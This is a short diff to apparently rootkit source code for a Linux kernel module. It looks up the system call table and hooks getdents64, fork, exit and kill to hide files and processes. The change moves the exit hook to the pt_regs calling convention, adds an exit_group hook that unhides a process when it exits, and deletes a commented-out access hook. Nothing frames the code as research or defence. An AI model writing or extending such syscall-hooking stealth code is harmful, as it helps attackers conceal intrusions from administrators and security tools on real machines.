@@ -9,15 +9,6 @@ unsigned long *find_syscall_table(void)
 {
     return (unsigned long *)kallsyms_lookup_name("sys_call_table");
 }
-
-// asmlinkage long rk_access(const struct pt_regs *pt_regs)
-// {
-//     const char __user *filename = (const char __user *)pt_regs->di;
-//     int mode = (int)pt_regs->si;
-//     // FM_INFO("Access: %s\n", filename);
-//     return orig_access(pt_regs);
-// }
-
 /* File hiding */
 
 asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
@@ -92,11 +83,18 @@ asmlinkage long rk_fork(void)
     return i;
 }
 
-asmlinkage long rk_exit(int error_code)
+asmlinkage long rk_exit(const struct pt_regs *pt_regs)
 {
-    // FM_INFO("exit from %d code %d\n", current->pid, error_code);
+    // FM_INFO("exit from %d\n", current->pid);
     unhide_proc(current->pid);
-    return orig_exit(error_code);
+    return orig_exit(pt_regs);
+}
+
+asmlinkage long rk_exit_group(const struct pt_regs *pt_regs)
+{
+    // FM_INFO("exit_group from %d\n", current->pid);
+    unhide_proc(current->pid);
+    return orig_exit_group(pt_regs);
 }
 
 asmlinkage long rk_kill(const struct pt_regs *pt_regs)
